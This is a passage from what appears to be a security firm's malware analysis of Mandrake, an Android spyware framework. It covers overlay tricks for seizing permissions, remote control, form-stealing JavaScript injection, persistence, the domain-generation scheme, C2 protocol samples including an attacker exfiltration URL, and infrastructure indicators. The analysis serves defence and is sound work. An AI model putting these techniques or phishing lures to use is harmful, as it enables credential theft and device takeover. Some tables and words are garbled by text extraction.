Years\n\n## Techniques\n\n### User manipulation - CAD payloads\n\nMandrake possess a very special module called ActivityCAD (possibly a reference to Computer-Aided Design terminology\n– CAD) which is used to draw over parts of the screen, over system alerts or over other applications’ visual content that\nattacker wants to hide from a vigilant user’s eye. The purpose of this module is to hijack screen taps and have the user\ntouch whatever parts of the screen are needed to elevate Mandrake’s privileges.\n\nIt will check if the command waiting to be executed has all the privileges needed. If the permissions are not already\ngranted, a complicated routine will follow to manipulate the user into granting them.\n\n##### Checking and requesting permissions\nThis kind of overlay attack is composed of multiple visual components. Width, height and text of every crafted visual\ncomponent to be displayed over the target menu are computed according to each phase. Other variables are also taken\ninto consideration: device model and type, device language, Android API level.\n\nThe text for the visual components is composed of fragments of a standard EULA. It is split in 7 parts and each phase\nuses specific parts of the text. They aim to construct a convincing message view.\n\nAs more protection elements have been added with each new Android version to protect users against such attacks, a\nMandrake privilege-gaining routine can have multiple phases. In all cases it will leave specific areas undrawn, such as the\n**_Allow button and will create the UI elements in such a way as to not trigger a “Screen Overlay Detected” case._**\n\nIn most cases, if the routine fails, the malware will resort to a simple Toast message while opening the corresponding\nsettings menu.\n\n##### Accessibility service permission\nThe most complex privilege gaining routine is the one that manipulates the user into giving Accessibility privilege to the\nmalware.\n\nOn newer versions of Android, starting with Pie (Android 9), it only displays a toast and opens the corresponding settings\nto allow the user to grant the permission. The toast message will be “For properly work, you must enable Android system”.\nIt uses the same message if the routine fails.\n\nOn older versions, a complex overlay drawing routine will be initiated.\n\n- First, it constructs the initial view over the list of registered accessibility services on the mobile. It positions the “I\n_agree” checkbox in such way that when the user checks it, they will be pressing, underneath, the accessibility entry_\ncorresponding to itself.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n\n- Height and width of view components may be computed based on the number of registered accessibility services.\n\n- Depending on the Android version, we even see pixel level display changes if the mobile phone language is French\n**or Spanish. The malware also checks whether it is running on a phone or a tablet and has different optimizations**\ndepending on the phone model.\n##### Ignoring battery optimization\nThis feature is needed to keep itself alive if the user’s phone is running low on battery, as the Android OS optimizes\nbattery life by killing power-consuming applications (such as the Mandrake malware).\n\nHere, height and width are also computed based on whether the mobile device is a tablet or not. EULA parts are used for\nthe text and the menu for requesting the feature to be given to the application is opened.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nOn the left, we have what the user sees and accepts. On the right, we see what was in fact being granted.\n\n##### Default SMS application\nTo gain full access to all phone and user data, the malware must set itself as a default SMS application. When creating\nthe visual components, height and width are computed based on whether the mobile device is a tablet, if the mobile\nphone manufacturer is Samsung, and on an Android API level relative to Android Nougat.\n\nBecause Mandrake needs to stay hidden and generate as little disruption as possible while being the default SMS\napplication, Mandrake also acts as a normal SMS viewer and displays the incoming SMSs.\n\nMandrake as the default SMS app\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n##### CAD blindfolded commands \nThere are more advanced configurations that the malware requires to stay fully functional. These are requested only\nafter the previous phases have been accomplished and privileges such as Accessibility and Drawing Overlay over other\napplications have been granted.\n\nIn this command processing phase of the CAD functionality, each command is guarded by a generic loading display.\nWhile the loading view is shown, the malware initiates a plethora of touches and actions using the Accessibility privileges\nin the background. For each command, there is specific blindfold time, after which the blindfolding display is removed.\n\n**Blindfolded actions**\n\n- Grants itself device administrator rights (2-second blindfold)\n\n- Deactivate play protect (5 seconds)\n\n- Requests and grants itself ignore battery optimizations (3 seconds)\n\n- Gives itself permission to read notifications (5 seconds)\n\n- Requests to allow screen capture and, of course, allows it itself (3 seconds)\n\n- Requests and gives itself permission to read contacts, call log, access location and others (4 seconds):\n\n- Set itself up as the default SMS application (2 seconds)\n\n- Just keep the blindfold up for 3 seconds. This command is used to hide other activities. As an example, it is used\nwhen wishing to remove a different application silently. It could also potentially be used to achieve a locker-type\nbehavior.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n### Losing total control (VNC functionality)\n\nAnother intrusive feature of Mandrake is VNC functionality (remote control of another device). The attacker literally\ntakes control over the mobile device and uses it as if it were in their own hands.\n\nThis is achieved by leveraging the Accessibility service privilege that Mandrake obtains. A JSON object with movement\ncommands is sent and the malware executes them accordingly. Screenshots of what is happening are constantly sent\n(as base-64 encoded data) during this routine to a different server that was provided by CnC when initiating the routine.\n\nThe following movement inputs are accepted:\n\n- click – clicks on a given coordinate\n\n- swipe – perform swipe to a given coordinate\n\n- unlock – can unlock the device\n\n- power – equivalent to pressing the power (lock) button\n\n- back – equivalent to pressing the back button\n\n- home – equivalent to pressing the home button\n\n- menu – equivalent to pressing the menu button\n\n- scroll_up – scrolls up\n\n- scroll_down – scrolls down\n\nThe following is a view of how an attacker sees the device when VNC command is activated\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n### Phishing at its best – credential theft and more\n\nIn the vast range of tricks up Mandrake’s sleeve, there is a key functionality that makes this threat dangerous for every\nuser. An elaborate web interaction monitoring system is constructed for information and credential theft.\n\nThe CnC provides:\n\n- A targeted application package name\n\n- A title and a message\n\n- URL or custom .html file\n\nThe package name is used to identify the targeted application. Depending on how the monitoring command was\nissued, the phishing mechanism will be triggered either when the user opens the indicated application or touches a\ncustom notification or alert dialog created by Mandrake, using the provided custom content. This adds an extra layer of\nauthenticity to the schema.\n\nIn some cases, after opening the targeted application, an alert with a custom-tailored message and title will appear,\nas opposed to a notification. This would manipulate the user into entering credentials or any other sensitive piece\ninformation. An example message would be:\n\n**_App Error! For your app to resume working, please go through the necessary steps of activation via the web_**\n**_version of your mobile banking._**\n\nAnother example – the one that Mandrake displayed to us during our analysis - was the following alert window that\nprompted us to change our Google Account (translations read: For a better security. We need you to add a backup telephone\n_(number) or to make sure that the current phone backup settings are active)_\n\nGoing further, the server provides an initial malicious JavaScript file for download and, depending on the operation\ncommand mode, will provide either a direct URL to load or a HTML file to download locally and load. In both cases, the\ninitial JavaScript code file is injected every time a page is loaded into a custom webview. In both cases, screen recording\nwill also be turned on and the recording data will be uploaded to a separate URL, specified by the CnC.\n\nThe JavaScript file once injected into the web page its purpose is to steal data from HTML forms by adding various event\nlisteners such as key up/change/submit to each elements of the HTML page\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n_Example_\n_of what data is exfiltrated via the JavaScript injection_\n\nOne interesting technical fact about this malicious JavaScript file is that it has a URL whitelist, and it does not attempt to\ncollect information from these pages:\n\n- [https://accesd.mouv.desjardins.com/tisecuADGestionAcces/LogonSSOviaAccesWeb.do](https://accesd.mouv.desjardins.com/tisecuADGestionAcces/LogonSSOviaAccesWeb.do)\n\n- [https://myaccount.google.com](https://myaccount.google.com/)\n\n- [https://www.paypal.com/myaccount/summary](https://www.paypal.com/myaccount/summary)\n\nOn these websites, the injected JavaScript fails to load due to security settings that do not allow JavaScript code to\naccess property “document” on cross-origin object.\n\nDuring our analysis, we observed Mandrake employing classical phishing attacks. The .html files visually resemble real\nfinancial institutions.\n\n**Example Fake Google Pay card detail page**\n\n[Visual elements and images used in these phishing attacks are hosted on https://imgur.com. For example, the MasterCard](https://imgur.com)\nimage used in one such phishing html file is found at https[:]//imgur[.]com/RJvVLUq. At the moment of writing, it **_was_**\n**_used over 14,000 times, an alarming number. We can also observe that this image was uploaded in July 2016, giving an_**\nextra hint towards when this exact phishing scenario was implemented.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n### Persistence mechanism\n\nMandrake secures persistence through a variety of methods. When all of them are enabled:\n\n- A reboot will not help\n\n- Sample cannot be uninstalled\n\n- The user will be stopped if he attempts to remove key malware privileges (accessibility or device admin)\n\nThe only way to remove Mandrake is to boot the device in safe mode, remove the device administrator special permission\nand uninstall it manually.\n\nAfter the user is tricked into accepting Accessibility service, the malware grants itself device admin privilege, among\nothers. As such, the application can’t be uninstalled before the administrator privilege is removed; however, the malware\ndoes not permit this. If the user tries to remove the device admin privilege, he will be sent to home screen.\n\nAlso, using the Accessibility privilege it always checks if the running application is _Settings and it looks in the UI to_\ndetermine if the user is trying to remove it from the Accessibility service. The user will be sent to the home screen to\ndeter his actions.\n\nIt is peculiar that, in order to identify that the user is trying to remove its Accessibility privilege, the malware looks for the\nword “Tesla” in the settings UI (a personal preference, one might suppose).\n\n**A Tesla in the last place you’d want to see one**\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n### No trace left behind – seppuku\n\nOn some occasions, Mandrake may need a clean exit. If the threat actors consider they have been compromised or (for\nwhatever other reason) want to cut a victim loose, a special command will be issued.\n\nThis happens via one of the more radical tools in Mandrake’s arsenal, the seppuku command.\n\nThis command initiates the factory reset of the mobile device, effectively wiping any traces of Mandrake (along with the\nuser’s private content, of course). Seppuku is only callable after Mandrake has acquired device admin privilege, otherwise\nthe factory reset cannot be initiated.\n\nIf the CnC passes the “seppuku” command, it will be handled and executed accordingly. Everything from the affected\ndevice will be lost.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n### Targeted applications\n\nDuring our analysis, because of a bug in CnC server implementation, monitoring commands targeting specific\napplications were constantly issued. The vast majority are financial applications, while some are shopping- or\ncommunication-related apps.\n\nCorelating the countries of the targeted applications users, we determine that Mandrake targets specific countries:\n**_Australia, Canada, United States, Poland, Netherlands, Germany, Austria, Italy, Spain, United Kingdom, Belgium, Brazil, Czech_**\n**_Republic and Singapore, besides targeting globally utilized popular applications._**\n\nWe have encountered more than 40 different targeted banking applications that serve Australian users. Hugely popular\napplications such as CommBank, NAB Mobile Banking, Westpac Mobile Banking, Bankwest, Bendigo Bank, St.George Mobile\n**_Banking, ING Australia Banking, AustralianSuper, Beyond Bank Australia; to name just a few._**\n\n**Targeted application name** **Mandrake alert dialog title** **Mandrake alert dialog content**\n\n\nCommBank CommBank App Error! For your app to resume working, please go\nthrough the necessary steps of activation via the web\nversion of your mobile banking.\n\nNAB Mobile Banking NAB Mobile Banking App Error! For your app to resume working, please go\nthrough the necessary steps of activation via the web\nversion of your mobile banking.\n\nWestpac Mobile Banking Westpac Load Failed The resource cloud could not be loaded because the\nApp Transport Security policy requires you to validate\nyour personal profile.\n\n\nPolice Association of SA au.com.iugo. au.com.iugo.policeassociation\npoliceassociation\n\nOther targeted popular banking applications from different countries.\n\n**Targeted application** **Targeted application** **Mandrake alert** **Mandrake alert dialog content**\n**client countries** **name** **dialog title**\n\n\nAustria Mein ELBA-App Raiffeisen Aufgrund der geplantenSystemwartungmüssen\nMeine Bank Sie Ihre Online-Banking-Dienstevalidieren.\n\nCanada Capital One Canada Capital One Update successfully completed! Authentication\nrequired.\n\nFrance Desjardins mobile Desjardins Desjardins”,”Erreur App! Pour que votre app\nservices recommence à fonctionner, veuillezsuivre les\nétapesnécessairesd›activation via la version Web\nde votrebanque mobile.\n\nGermany Sparkasse Ihre mobile Sparkasse Ihre App-Fehler! DamitIhre App\nFiliale mobile Filiale wiederfunktioniert, führen Sie die\nerforderlichenAktivierungsschritteüber die\nWebversionIhres Mobile Banking aus.\n\nItaly Postepay PosteMobile Errore app! Affinché la tua app possariprendere\na funzionare, esegui i passagginecessari per\nl’attivazionetramite la versione web del tuo\nmobile banking.\n\n\nNetherlands ABN AMRO ABN AMRO App-fout! Om uw app telatenwerken, moet u\nMobielBankieren de nodigeactiveringsstappendoorlopen via de\nwebversie van uwmobielbankieren.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**Targeted application** **Targeted application** **Mandrake alert** **Mandrake alert dialog content**\n**client countries** **name** **dialog title**\n\n\nPoland IKO iPKO Bladaplikacji! Aby wznowicdzialanieaplikacji,\nwykonajniezbednekrokiaktywacji za\n\nUnited Kingdom Scotiabank Mobile Scotiabank App Error! For your app to resume working, please\nBanking Mobile go through the necessary steps of activation via\nthe web version of your mobile banking.\n\n\nSingapore UOB Mighty Singapore UOB Personal\nInternet\nBanking\n\n\nDue to scheduled system maintenance, we\nrequire that you validate your online banking\nservices.\n\n\nSpain Santander Santander Error de aplicación! Para que\nsuaplicacióncontinúefuncionando, siga los\npasosnecesarios de activación a través de la\nversión web de su banca móvil.\n\n\nUnited States Bank of America Mobile Bank of App Error! For your app to resume working, please\nBanking America go through the necessary steps of activation via\nthe web version of your mobile banking.\nThe actors are clearly targeting economically thriving countries.\n\nThere are also targeted applications that are globally utilized. Some are related to crypto currency while others are\nlabeled as communication tools. There is even a casino game application and some productivity tools among them.\n\n**Targeted application name** **Mandrake alert** **Mandrake alert dialog content**\n**dialog title**\n\n\nPayPal Mobile Cash: Send and Paypal Update successfully completed! Please verify your login\nRequest Money Fast credentials.\n\nMicrosoft Outlook: Organize Your Microsoft Due to scheduled system maintenance, we require that you\nEmail & Calendar services update validate your online microsoft account.\n\nGoogle Pay: Pay with your phone Google Pay Application updated. Please verify your login credentials.\nand send cash\n\n\nAmazon Shopping - Search Fast, com.amazon.\nBrowse Deals Easy mShop.android.\nshopping\n\n\ncom.amazon.mShop.android.shopping\n\n\nAliExpress - Smarter Shopping, com.alibaba. com.alibaba.aliexpresshd\nBetter Living aliexpresshd\n\nYahoo Mail – Organized Email Yahoo mail For improved security. We require that you add a recovery\nphone or ensure that your current phone recovery settings are\nenabled.\n\nVegas Slots Galaxy Free Slot Gemini Trust Login to your account.\nMachines Company™\n\nCoinbase – Buy & Sell Bitcoin. Coinbase App Error! For your app to resume working, please go through\nCrypto Wallet the necessary steps of activation via the web version of your\nmobile banking.\n\nBlockchain Wallet. Bitcoin, Bitcoin Blockchain Due to scheduled system maintenance, we require that you\nCash, Ethereum validate your Blockchain Wallet.\n\nABCC Exchange - Easily trade ABCC Exchange Application updated! Authentication required for completion.\nCrypto\n\nVIP Access VIP Access Symantec VIP Access helps protect your online accounts and\ntransactions\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n## Mandrake evolution timeline\n\nMandrake has evolved considerably over the years. The first versions, released in 2016, had only a few of the exfiltration\ncapabilities of the current darkmatter versions.\n\nWe have mapped the evolution of Mandrake, functionally, as follows\n\nThe first-ever version of Mandrake was released in 2016 and was part of the oxide branch. They were composed of an\ninitial application impersonating Adobe; a core was downloaded.\n\nThe second branch was **briar, also released in 2016. No notable extra functionality was added. However, Mandrake**\nimitated a generic Android system application.\n\nLate 2016 saw the third branch, ricinus, that continues to be developed even today. Functionality such as blocking calls\nand SMS history exfiltration were added in this branch.\n\nThe Oxide, **briar and** **ricinus branches all corresponded to the first Mandrake wave that appeared and stayed active**\nbetween 2016 and April 2017. This phase had only two components: an initial foothold sample and the downloaded core.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nThe Second (current) wave started in July 2018, more than a year after the first wave, with the branch darkmatter. It is\nunclear why the threat actors waited over a year to start a second wave, but we believe they needed that time to improve\nthe design and move the campaign to Google Play. At this point, Mandrake started deploying samples on Google Play\nand formalized the structure. There are now loaders and core components. The loader components were distributed via\nGoogle Play, as normal application with an additional role of downloading and loading the core.\n\nFunctionality to work with Android notifications was introduced here, along with recording and remote control capabilities.\nIn this phase, Mandrake evolved quite rapidly. There was no further development on the ricinus branch, at least from the\nsamples we have collected.\n\nThis structure of only loader and core did not last. This way of deploying the core left too many traces; in fact, there was\nonly one loader type component ever on Google Play, the Abfix application.\n\nBy the beginning of 2019, a new component type was introduced – the dropper. These applications came with as little\ncode as possible, just enough to download the next component, the loader, and to create an initial profile of the victim.\nThe droppers were all on Google Play at some point. The Mandrake authors started dedicating resources to building a\nmarketing front for the applications. Some had Twitter accounts associated, as well as YouTube channels, Facebook\naccounts and more. The ricinus branch also continued development.\n\nFeatures added during this period mostly related to keeping up with Android OS security changes and bugfixes.\n\nNow, Mandrake continues mainly with the darkmatter branch and secondarily with ricinus.\n\n**Telemetry data from the second wave (2018 – now)**\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n### Certificates mapping\n\nLet’s take a look at the certificates used to sign the samples: The oxide versions used the smoking gun Adobe Systems\n_Incorporate._ **Briar,** **ricinus** and **darkmatter, learning from past mistakes, continued with random words such as** _Jack_\n_Daniels, Sacramento, Expert Inc._\n\n### Firebase\n\nOur investigation found that some versions of Mandrake used Google’s firebase API to add an additional communication\nvector, while others only used it for the legitimate functionality. The functionality was dropped at some point.\n\nThe Firebase behavior is triggered as follows:\n\n- When a Firebase token is generated, it is added to the loader CnC communication fingerprint\n\n- If a custom Firebase message is received from the Firebase Server, the “action” field is taken from the remote\nFirebase message. Depending on the value, the following happens:\n\n  - “update”\n\n  - shows a Google Play notification to update itself by installing a newer version.\n\n  - In this case the link is hardcoded to the Coincast application page on Google Play at https[:]//play.google[.]\ncom/store/apps/details?id=com.coincast.app\n\n  - _It is worth mentioning that this is the only version of a loader found that indicates an update to a dropper component_\n\n  - **“restart”**\n\n  - **“log” - will pass a “log” message to the core component**\n\n  - if none of the above, directly pass the “action” field retrieved from the firebase message to the core\n\n### A fleeting (toxic) flower\n\nIn one of the samples, a highly interesting string caught our attention. The name of a beautiful and toxic flower, nerium,\nfrom Nerium oleander.\n\nSimilar to other branch names up to that point, briar and ricinus, we concluded that nerium initially would have been the\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n## CnC Infrastructure\n\n### CnC communication\n\nThe native part of Mandrake is much more than a loop that queries the C2 server periodically for new commands. A\nnative thread is dedicated to this task alone, so regardless of what the user-facing part of the app is doing, Mandrake will\ncontinue to talk to the server in the background and receive commands.\n\nBy default, the duration between server requests is 180 seconds, but that can change at the server’s whim with the 1002\ncommand.\n\nImplementation of most commands is delegated to the Java side of the app, with the exception of the simplest ones:\nchange the request rate, provide new domains to connect to, etc. A full list of commands and their meaning is provided\nin the appendix of this paper.\n\n##### Communication protocol: TCP/IP layer\nCommunication with the CnC takes place over IPv4 TCP standard https port 443. In the newer version 3.2.1 of the core\nand loader components port 7777 is used instead.\n\nSome IP range addresses are blocked from the beginning by the firewall configuration of the server, and attempting to\ntalk with the CnC server from one of these addresses will result in a timeout as these packets are dropped by the remote\nhost’s kernel.\n\nTo contact the CnC, Mandrake uses a list of domains including both hardcoded (but obfuscated) ones and DGA generated\nones. The list of hardcoded domains has changed slightly over the years; initially only rendfiles.top was used but later it\nwas removed and the authors switched to more meaningful domain names: androidfrimware.com, androidfirmware.top,\nandroidfirmware.cc, androidfirmware.ir, androidfirmware.ca.\n\nAs of now, the domains androidfrimware.com, androidfirmware.top and androidfirmware.ca areregistered by the malware\nauthors, but only androidfirmware.top points to a CnC server.\n\nThe domain generation algorithm uses the current date and time: specifically the current year, month, the day of the month\ntogether with a hardcoded magic number (that was always 0xAAAAA in the samples we examined) to deterministically\ngenerate 4 domains per day.\n\nHere is an example of all the domains that would be generated for the dates from the 21[st] of February 2020 to the 1[st] of\nMarch 2020.\n\n**Date** **#1** **#2** **#3** **#4**\n\n\n2020.02.21 gogloatxilhsrp.in liikpqeewqfbbb.me rftrdukwokeupo.cc skojkenwkltpdx.su\n\n2020.02.22 pwxqmfshmbstha.me jwxqdqacsxviul.cc myhfcoskodhotl.su munqxxomppdljm.tw\n\n2020.02.23 kgskjbrvcsdlxm.cc uqjcdbrpwfqcxw.su mdincycqptqepx.tw whwmpjshscirgh.cn\n\n2020.02.24 nynojmdctfyfqh.su hpqqnfrdaesnso.tw qxpblsbilvcuul.cn ffybqhfovtgccr.top\n\n2020.02.25 leyjomkwhlqjkn.tw coantvvdbgshkn.cn oxtgxicotwmxny.top iaasfqeqnlsxbt.in\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n**Date** **#1** **#2** **#3** **#4**\n\n\n2020.02.27 vebksyhwsqjofm.top bcinkkhbvrjywg.in rklhuxlirwpvtd.me fblrihdcaivadu.cc\n\n2020.02.28 vsgmbchajqsyas.in feoniwxykxyaim.me vodpculutkpkiq.cc wmjmohlfnxlvqi.su\n\n2020.02.29 qepanojsyuvrym.me bpyomvjemsetjx.cc iwiwbfbyuialhb.su crxreihnulxdbb.tw\n\n\n2020.03.01 vcthebhgoowmjl.me ufotwgmgbabyst.cc wwlfqsvbwkwrxt.su yelrfqsbnuyakr.tw\nAs far as we know, no DGA domains were ever registered with a domain name provider.\n\n##### Communication protocol: TLS/encryption layer\nMandrake uses TLS encrypted communication to talk to the CnC. Besides the obvious traffic encryption capabilities\noffered by TLS, authentication based on the remote peer’s certificate is also used.\n\nTo this end, the client app ships with a public key certificate of a certificate authority (CA) with the common name (CN)\nof ‘android.com’.\n\nThe client will only connect to a server whose certificate was signed by this CA: a form of certificate pinning. This\nprevents impersonating the CnC server under normal circumstances. One will be able to imitate the real server only if\nthey own this CA’s private key as well to sign their server’s certificate.\n\nThe certificate supplied by the CnC server, androidfirmware.top, is therefore signed by this CA and has the CN server.\nandroid.com unremarkably. The server performs client authentication as well, to prevent rogue clients from connecting.\nFor this reason, a certificate belonging to the client and its private key are distributed with the application.\n\n### Communication protocol: application data\n\nStripping away the TLS encryption layer leaves us with the application data it transmits. Mandrake uses a custom jsonlike serialization format provided by a publicly available library: happyponyland.net/c-serialization.\n\nIn this format, requests and responses are represented by a linked list of node structures, the equivalent of an array of\ndictionaries in JSON land. For example, the following node shows a request to the server coming from the client.\n\nnode #1\n\n{\n\nuid “aac5d83c0e9807c2”;\n\nrequest “1000”;\n\ndata_1 “29|10|sailfish|22601|ro||<..fields omitted..>|dropper|0|0|0||0|0|0|0||”;\n\ndata_2 “dropper”;\n\ndt 1582411207;\n\nnext NULL;\n\n}\n**uidfield is used by server to uniquely identify each client.**\n\n- **request field is a numeric code that specifies which operation this node represents. A request to the server with the**\nopcode 1000 is sent every time the client contacts the server. It serves as a generic “ping” request that supplies\nthe server with the latest info about the client. Among the info that is sent with request 1000 the following are of\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nthe Mandrake component (dropper/loader/core) and its version. This means that short of network failures the\nserver is always up to date with the client.\n\n- **data_1 and data_2 are simply parameters corresponding to the given command.**\n\n- **dt field is the Unix time (in seconds) of the instant this node was generated at.**\n\nAfter the client has sent its list of requests to the server it expects back a list of responses not much different in format\nfrom the requests:\n```\n  node #1\n  {\n   response “aac5d83c0e9807c2”;\n   command “1010”;\n   data_1 “com.android.vending||VXBkYXRl|60”;\n\n```\ndata_2 “192.168.69.248|androidfirmware.top|/apk/darkmatter_loader_3.2.0.apk||1”;\n```\n   dt “1579788784”;\n   next NULL;\n  }\n\n```\n**command** field is a response opcode. Response opcodes are more varied than their request opcode counterpart,\nthere’s a whopping number of 29 response opcodes. (see appendix)\n\n- **dt field has different semantics here however, it tells the client when to execute the received command.**\n\nIllustrated below is a client-server conversation during a live run on a physical phone. The loader component of mandrake\nhas phoned home with the device’s fingerprint (request opcode 1000) and has received in turn a command from the C2\nto download the core component (response opcode 1010).\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n### Leaked commands, phishing attempts\n\nA bug in the control server has made it possible to receive commands intended for victims in the wild. It seems that at\nsome point client authentication on the server had ceased working and the server responds randomly with the contents\nof a transmission buffer:\n\nThis command above, for example, is a “download component” command meant for UID “0177c34dce47d8f3”.\n\nCommand to phishaaScript code. It tells the client to display either a notification or an alert dialog that urges the user\nto sign in to their banking or social media account.\n\nThe text of the dialog and of the notification are provided with the command so they can be localized or tailored for a\nspecific user, also the package name of an application present on the user’s device is provided (com.google.android.\n_calendar in the picture above; usually it is something common like the Android calendar app, the browser app, or the_\nPlay Store app).\n\nWhen the user clicks the notification or presses the confirm button of the dialog, the associated app will open. When\nthe associated app starts, even if it was started by the user alone, a webview component is loaded in an overlay. This\nmeans that, in some cases, for legitimate apps that are themselves webviews, the user is not aware he’s interacting\nwith a credential-stealing page.\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nAs a backup measure in case JavaScript injection fails, the screen is also recorded, this MP4 recording is saved as\n**<timestamp>.dat in the private files dir and it is later sent to the C2 server with a post request to URL http://androidfirmware.**\n**top:8888/?r=<victim UID>.**\n\nThe command highlighted above, for example, displays the following:\n\n**The dialog, notification, and page corresponding to the above command**\n\nBy polling the CnC server at regular intervals, we were able to find out which sensitive info the attackers are interested in\nstealing as well as the text that’s displayed and the pages that are served. This list of targeted apps is shown and further\nanalyzed under the Victims of poison section.\n\n## CnC sinkholing\n\nA domain left unregistered by the authors of the malware, androidfirmware.ir, has made it possible for us to spoof the\nC2 server and log the incoming addresses.\n\nMore than that, because the client’s certificate was signed by the same CA (android.com) as the one used for verification\npurposes by the client, it is enough to grab it together with its private key and use it to run a server. This allows for\ncommunication to extend past the TLS handshake which would otherwise fail and, more importantly, it allows for\nreceiving client fingerprints that come with request 1000. This has helped us get an accurate map of victims and figure\nout which geographical areas the attackers are targeting in particular.\n\nC2 domains are tried in sequence, starting with the hardcoded ones in the order they were written and continuing with\nrandomly generated ones.\n\nFor example, the list of hardcoded domains that comes with versions 3.2.0+ of Mandrake is the following:\n\nandroidfirmware.top\n\nandroidfrimware.com\n\nandroidfirmware.ca\n\n\nThe command highlighted above, for example, displays the following:\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\nandroidfirmware.ir\n```\n xjkbhysexthnpl.top\n\n```\nNfmmlrkagflemt.top\n\n_androidfirmware.ir, the one we acquired, is the fourth on that list, whenever the first three are not responding (either_\nbecause the domain does not resolve, or the server is inactive) clients will try to connect to our server. This means we\nonly get a fraction of the infected userbase. However, it proved enough for gathering useful statistics.\n\nOver the span of three weeks, 688 unique clients were spotted based on the UID alone (those that had multiple components\non their device were counted once).\n\n### Pivoting the Threat Infrastructure\n\nMandrake used several hardcoded Command and Control servers, most of them active for the full 4 years. Below,\nwe’ve compiled an overview of the Command and Control infrastructure and we’ve tried to connect additional attack\ninfrastructure by pivoting over the infrastructure.\n\nOur starting point is the hardcoded command and control servers:\n\nKnown C2 Domains\n\n**Domain** **Registration Date**\n\n\nrendfiles.top 2016-02-11\n\nandroidfrimware.com 2016-04-06\n\nandroid-soft.top 2016-04-09\n\nandroidfirmware.ca 2016-06-06\n\nnfmmlrkagflemt.top 2016-11-17\n\nxjkbhysexthnpl.top 2016-11-23\n\nlivingstream.mobi 2016-12-14\n\n\nandroidfirmware.top 2019-08-21\n\nWe spotted active C2 servers during research on the following IP addresses:\n\n**IP address** **Domain name** **Hosting provider** **Server location**\n\n\n159.69.66.184 androidfirmware.top Hetzner Online GmbH Germany\n\n\n185.51.246.111 androidfrimware.com Zomro B.V. Netherlands\nThe second one no longer has a hardcoded domain pointing to it, but is nevertheless active. We have noticed it being\nused together with the domain name in the second column by the “ricinus” branch of the malware with some of the\ncommands received from the main C2 server, the one that’s first in the table.\n\nThe following services are in common on these machines: SSH on 1234, MySQL server on standard port 3306.\n\nTimeframe 2016-02-11 to Now\n\nTimeline rendfiles.top\n\n\n2016-02-11 rendfiles.top Domain registered through alpnames/Fmonsy.com\n\n2016-02-11 rendfiles.top [Registrant email: joernmortensen@mail.com](mailto:joernmortensen@mail.com)\n\n2016-02-13 rendfiles.top Domain points to 209.44.113.1i\n\n\n-----\n\nUprooting Mandrake: The Story of an Advanced Android Spyware Framework That Went Undetected for 4 Years\n\n\n2016-12-04 rendfiles.top Domain registered through alpnames/Fmonsy.com\n\n2017-01-19 rendfiles.top Domain points to 104.193.252.166\n\n2017-03-14 rendfiles.top Domain points to domain parker\n\n\n2017-03-20 rendfiles.top Domain deleted\n\nTimeline androidfrimware.com\n\n\n2016-04-06 androidfrimware.com Domain registered through namecheap/cloudns.net\n\n2016-04-09 androidfrimware.com Domain points to 95.215.45.59\n\n2019-11-28 androidfrimware.com Domain points to 185.51.246.111\n\n\nTimeline android-soft.top\n\n2016-04-09 android-soft.top Domain registered through Eranet/fmonsy.com\n\n2016-04-09 android-soft.top [Registrant email: petrillarionov2034@mail.com](mailto:petrillarionov2034@mail.com)\n\n2016-10-01 android-soft.top Domain points to 209.44.113.1\n\n2016-10-31 android-soft.top Domain points to 104.193.252.166\n\n2017-05-15 android-soft.top Domain registered through 101domain.com\n\n2017-05-15 android-soft.top Registrant email:\n\n2018-06-21 android-soft.top Domain points to 185.67.2.87\n\n2019-01-09 android-soft.top Domain points to 95.154.195.40\n\n2019-02-02 android-soft.top Domain registered through Myhostadmin.net\n\n2019-04-26 android-soft.top Domain points to domain parkers\n\nTimeline nfmmlrkagflemt.top\n\n\n2016-11-17 nfmmlrkagflemt.top Domain registered through namecheap/zomro.com\n\n2016-11-17 nfmmlrkagflemt.top Domain points to 185.51.246.111\n\n2018-10-02 nfmmlrkagflemt.top Domain points to domain parkers\n\n\nTimeline androidfirmware.ca\n\n2016-06-06 androidfirmware.ca Domain registered through Enom/cloudns.net\n\n2018-07-07 androidfirmware.ca Domain expired+deleted\n\n2019-08-25 androidfirmware.ca Domain registered through namecheap/cloudns.net\n\n2019-08-25 androidfirmware.ca [Registrant email: ravi-maturi@hotmail.com](mailto:ravi-maturi@hotmail.com)\n\n2019-09-27 androidfirmware.ca Domain points to 94.228.219.76\n\n2019-11-29 androidfirmware.ca Domain points to 159.69.66.184\n\nTimeline xjkbhysexthnpl.top\n\n\n2016-11-23 xjkbhysexthnpl.top Domain registered through 